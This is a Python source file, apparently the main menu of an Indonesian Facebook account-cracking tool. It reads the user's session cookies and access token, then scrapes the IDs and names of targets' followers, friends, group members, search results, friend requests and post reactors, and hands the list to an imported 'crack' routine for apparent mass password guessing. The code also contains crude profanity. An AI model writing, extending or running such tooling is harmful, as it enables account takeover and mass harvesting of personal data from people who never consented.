# coding:utf-8
# update sabtu 17 juli 2021
# rekod tod? sertain sumbernya heheh :v
# github : https://github.com/itsuki10
# facebook : https://www.facebook.com/nakano.itsuki.18488

from modul import *
from wibu.login import login
from .pepek import shielded as guard
from .ngewe import crack as cracking
from .ngewe import gadag_user as asu
from .report_bug import report as laporkan

url="https://mbasic.facebook.com"
longentod="lo lebih ngentod"

class awokawokawok:
	
	def __init__(self):
		self.cek_folder()
		self.semua=open("cookies/info.txt").read()
		self.jonson=json.loads(self.semua)
		self.cookies=self.jonson["cookies"]
		self.main_menu()
		
	def cek_folder(self):
		if os.path.exists("result") is False: os.mkdir("result")
		if os.path.exists("cookies") is False: os.mkdir("cookies")
		if os.path.exists("result/live.txt") is False: open("result/live.txt","a")
		if os.path.exists("result/chek.txt") is False: open("result/chek.txt","a")
		if os.path.exists("cookies/info.txt") is False:
			os.system("clear")
			cookie=input("\n  ! make sure to access facebook in data mode so that you can convert it to tokens at the same time, so that the process of dumping your/public friend list id using the facebook graph so that you don't get limited by zuki\n\n ? enter facebook cookies : ")
			while cookie in (""," "):
				print(" ! DONT BE EMPTY")
				cookie=input(" ? input cookie facebook : ")
			login(url,{"cookie":cookie})
	
	def cek_cookies(self):
		global url
		try: respon=req.get(f"{url}/profile.php",cookies=self.cookies)
		except koneksi_error: exit(" ! kesalahan pada koneksi")
		if "mbasic_logout_button" not in respon.text:
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit(" ! cookie expired, ")
		url=url.replace("mbasic","free") if "free.facebook" in respon.url else url
		os.system("clear")
	
	def set_ua(self):
		print("\n* useragent saat ini : "+open("saya_gans/ngewe/.useragent").read().strip()+"\n" if os.path.exists("saya_gans/ngewe/.useragent") else "")
		ua=input(" ? masukkan useragent : ")
		while ua in (""," "):
			print(" ! jangan kosong ngentod")
			ua=input(" ? masukkan useragent : ")
		open("saya_gans/ngewe/.useragent","w").write(ua)
		print("\n * sukses menganti user agent" if os.path.exists("saya_gans/ngewe/.useragent") else "\n ! gagal mengganti useragent")
		exit(" * jalankan ulang tools nya")
	def main_menu(self):
		global longentod
		self.cek_cookies()
		takeuser=asu(url,self.cookies)
		print("          \x1b[36m╔╦╗┬─┐┌─┐┌─┐   ╔═╗┌┐ \n           ║║├┬┘├─┤│ ┬───╠╣ ├┴┐\n          ═╩╝┴└─┴ ┴└─┘   ╚  └─┘\n\x1b[0m\n")
		print(            f" * UID  : {self.jonson['uid']}")
		print(            f" * NAME : {self.jonson['nama']}")
		print(            f" * UNME : {self.jonson['username']}\n" if self.jonson["username"] is not None else "")
		print(" 1.   <--   [CRACK FROM FOLLOWER ]")
		print(" 2.   <--   [CRACK FROM FRNDLIST ]")
		print(" 3.   <--   [CRACK FROM GROUPS/M ]")
		print(" 4.   <--   [CRACK FROM USER/NAME]")
		print(" 5.   <--   [CRACK FROM PUBLICK  ]  [MAIN]") 
		print(" 6.   <--   [CRACK FROM F/RQUESTS]")
		#print(" 7.   <--   [CRACK FROM POST/LKER]") 
		#print(" 8. profile guard")
		#print(" 9. hapus cookie")
		#print(" r. report bug")
		#print(" d. [DONATE :D")
		print(" s.   <--   [CHANGE U/A]")
		print(" 0.   <--   [LOGOUT]\n")

		pilih=input(" CHOSE ->> : ")
		while pilih in (""," "):
			print(" ! DONT BE EMPTY")
			pilih=input(" CHOSE ->> : ")
			
		if pilih in ("1","01"):
			user=input(" UID/PUBLK/FOLOWER : ")
			while user in (""," "):
				print(" ! DONT BE EMPTY")
				user=input(" UID/PUBLK/FOLOWER : ")
			usek=f"{url}/profile.php?id={user}&v=followers" if user.isdigit() else f"{url}/{user}?v=followers"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit("!connection error")
			if "Page not found" in respon or "connection error" in respon:
				kembali(f" ! user with id {user} not found  " if user.isdigit() else f" ! ! user with username {user} not found",self.main_menu)
			if "You Can't Use This Feature Now No Friends To Show" in respon:
				kembali(" WAIT FOR 1HOUR",self.main_menu)
			else:
				print(" * TARGT UN : "+parser(respon,"html.parser").find("title").text)
				longentod=takeuser.followers(respon)
			
		elif pilih in ("2","02"):
			usek=f"{url}/me/friends" if self.jonson['username'] else f"{url}/profile.php?v=friends"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "No Friends To Show" in respon:
				kembali(" ! DONT EMPTY",self.main_menu)
			if os.path.exists("cookies/token.txt"):
				lol=[]
				token=open("cookies/token.txt").read()
				try:
					respons=req.get(f"https://graph.facebook.com/me/friends?limit=5000&access_token={token}")
				except koneksi_error:
					exit(" ! connection error")
				if respons.text[2:6] == "data":
					for x in respons.json()["data"]:
						lol.append(x["id"]+"(Aap Gans)"+x["name"])
					if len(lol) == 0:
						exit(" ! failed to take id")
					print(f"\r * total id that can be : {len(lol)}",end="")
					longentod=lol
				else:
					longentod=takeuser.fl(respon)
			else:
				longentod=takeuser.fl(respon)
			
		elif pilih in ("3","03"):
			user=input(" ? id grup : ")
			while user in (""," "):
				print(" ! DONT BE EMPTY")
				user=input(" ? id grup : ")
			usek=f"{url}/browse/group/members/?id={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Halaman Tidak Ditemukan" in respon or "Konten Tidak Ditemukan" in respon:
				kembali(f" ! group with id {user} not found or you haven't joined yet limit bro, please wait 1hour or change account Sorry, we couldn't find",self.main_menu)
			elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon:
				kembali(" ! limit bro, please wait 1hour or change account",self.main_menu)
			else:
				print(" * target name : "+parser(respon,"html.parser").find("title").text[8:])
				longentod=takeuser.grup(respon,user)
			
		elif pilih in ("4","04"):
			print(" ! fill in the query with the name of the person")
			user=input(" ? query : ")
			while user in (""," "):
				print(" ! DONT BE EMPTY")
				user=input(" ? query : ")
			usek=f"{url}/search/people/?q={user}"
			try: respon=req.get(usek,cookies=self.cookies).text
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "please enter id manually failed to take id" in respon:
				kembali(f" ! person with name {user} not found",self.main_menu)
			else:
				jumlah=input(" ? limit(100) : ")
				while jumlah.isdigit() is False:
					print(" ! DONT BE EMPTY" if jumlah in (""," ") else " ! harus berupa angka")
					jumlah=input(" LIMIT? : ")
				longentod=takeuser.cari(respon,int(jumlah))
			
		elif pilih in ("5","05"):
			user=input("  UID/PUBLIK/FRNDZ : ")
			while user in (""," "):
				print(" ! DONT BE EMPTY")
				user=input("  UID/PUBLIK/FRNDZ : ")
			usek=f"{url}/profile.php?id={user}&v=friends" if user.isdigit() else f"{url}/{user}/friends"
			try: respon=req.get(usek,cookies=self.cookies)
			except koneksi_error: exit(" ! kesalahan pada koneksi")
			if "Tidak Ada Teman Untuk Ditampilkan" in respon.text:
				kembali("  ! enter the post url correctly check the post, please wait The requested page cannot be displayed now People who responded",self.main_menu)
			elif "Anda Tidak Dapat Menggunakan Fitur Ini Sekarang" in respon.text:
				kembali(" WAIT 1HOUR",self.main_menu)
			elif "Konten Tidak Ditemukan" in respon or "Halaman yang Anda minta tidak ditemukan." in respon.text:
				kembali(f" ! person with name {user} not found" if user.isdigit() else f" ! pengguna dengan username {user} tidak ditemukan",self.main_menu)
			else:
				print(" * T4RGT NAME : "+parser(respon.text,"html.parser").find("title").text)
				if os.path.exists("cookies/token.txt"):
					lol=[]
					if user.isdigit() is False:
						import urllib.request
						linimasa=f'href="/{user}\?v\=timeline\&amp;lst\=(.*?)"'
						tentang=f'href="/{user}/about\?lst\=(.*?)"'
						foto=f'href="/{user}/photos\?lst\=(.*?)"'
						user=re.search(linimasa,respon.text)
						user=user.group(1) if user else user
						user=user if user else re.search(tentang,respon.text)
						user=user.group(1) if type(user) == re.Match else user
						user=user if user else re.search(foto,respon.text)
						user=user.group(1) if type(user) == re.Match else user
						#user=urllib.request.unquote("".join(re.findall("lst=(.+)",respon.url))).split(":")
						user=urllib.request.unquote(str(user)).split(":")
						if len(user) == 3:
							user=user[1]
						else:
							exit(" ! failed to find id, please enter id manually failed to take id")
					token=open("cookies/token.txt").read()
					try:
						respons=req.get(f"https://graph.facebook.com/{user}/friends?limit=5000&access_token={token}")
					except koneksi_error:
						exit(" ! connection error")
					if respons.text[2:6] == "data":
						for x in respons.json()["data"]:
							lol.append(x["id"]+"(Aap Gans)"+x["name"])
						if len(lol) == 0:
							exit(" ! gagal mengambil id")
						print(f"\r * TOTAL ID  : {len(lol)}",end="")
						longentod=lol
					else:
						longentod=takeuser.fl(respon.text)
				else:
					longentod=takeuser.fl(respon.text)
			
		elif pilih in ("6","06"):
			try: respon=req.get(f"{url}/friends/center/requests/#friends_center_main",cookies=self.cookies).text
			except koneksi_error: exit(" ! connection error")
			if "Tidak Ada Permintaan" in respon:
				kembali(" ! tidak ada permintaan pertemanan",self.main_menu)
			longentod=takeuser.request(respon)
			
		elif pilih in ("7","07"):
			user=input(" ? url/id post : ")
			while user in (""," "):
				print(" ! DONT BE EMPTY")
				user=input(" ? url/id post : ")
			if user.isdigit():
				user=f"{url}/{user}"
			else:
				try:
					asyu=re.search("https://(.*?)\.facebook\.com/",user).group(1)
				except AttributeError:
					exit(" ! enter the post url correctly check the post")
				user=url+user.split(f"https://{asyu}.facebook.com")[1]
			print(" * mengecek postingan, mohon tunggu")
			try: respon=req.get(user,cookies=self.cookies).text
			except koneksi_error: exit(" ! connection error")
			if "please wait The requested page cannot be displayed now People who responded." in respon:
				kembali(" !  ! no one responded to posts ",self.main_menu)
			try:
				ufi=re.search('\<a\ href\=\"\/ufi\/reaction\/profile\/browser\/(.*?)"',respon).group(1).replace("&amp;","&")
				respon=req.get(f"{url}/ufi/reaction/profile/browser/{ufi}",cookies=self.cookies).text
				if "Semua 0" in respon or "Orang yang menanggapi" not in respon:
					kembali(" ! tidak ada yang menanggapi postingan",self.main_menu)
				#xx="".join(re.findall('href="(/ufi/reaction/profile/browser/fetch/\?limit\=\\d*\&amp;total_count\=\\d*\&amp;ft_ent_identifier\=\\d*.*?)">Semua',respon)).replace("&amp;","&")
				total=re.search("total_count\=(\\d*)",respon).group(1)
				user=re.search("ft_ent_identifier\=(\\d*)",ufi).group(1)
				print(" ! this process takes a little time so please wait and make sure the internet connection is fast ")
				respon=req.get(f"{url}/ufi/reaction/profile/browser/fetch/?limit=1500&total_count={total}&ft_ent_identifier={user}",cookies=self.cookies).text
				print(f" * {total} ")
				if int(total) > 1500:
					print(" ! the process of taking the id per page may take a little longer but per page, the id taken is around 1.5 thousand, so please wait and be patient :)")
				jumlah=None
				if int(total) > 2000:
					print(f" * LIMIT {total}")
					while True:
						jumlah=input(" LIMIT? : ")
						if jumlah.isdigit() is False:
							print(" ! DONT BE EMPTY" if jumlah in (""," ") else " ! harus berupa angka")
						elif int(jumlah) > int(total):
							print(f" ! maximum number of {total} idiots, snap or be stupid ")
						else:
							break
				jumlah=int(jumlah) if jumlah else jumlah
				longentod=takeuser.like_post(respon,jumlah)
			except AttributeError: exit(" ! connection error")
			except koneksi_error: exit(" ! connection error")
			
		elif pilih in ("8","08"):
			guard(url,self.cookies,self.main_menu)
		
		elif pilih in ("9","09"):
			try: os.remove("cookies/info.txt");os.remove("cookies/token.txt")
			except: os.system("rm -rf cookies/info.txt && rm -rf cookies/token.txt")
			exit(" ! gagal menghapus cookie, silahkan hapus secara manual" if os.path.exists("cookies/info.txt") else " * sukses menghapus cookie")
		
		#elif pilih in tuple("rR"):
			#laporkan(url,self.cookies)
		
		elif pilih in tuple("sS"):
			self.set_ua()
		
		elif pilih in tuple("dD"):
			exit(" hai, jika ingin berdonasi silahkan untuk mengisi pulsa ke nomor \x1b[1;37m085871118048\x1b[0m, saya sangat berterimakasih jika anda benar-benar ingin berdonasi :)")
		
		elif pilih in ("0","00"):
			exit(" * thanks for using my tools regards by SDJ:v")
			
		else:
			kembali(" ! OUT",self.main_menu)
		
		if longentod!="lo lebih ngentod":
			if len(longentod)!=0:
				cracking.crack(url,longentod)
			else:
				exit(" ! ")
		else:
			exit(" ! error ")
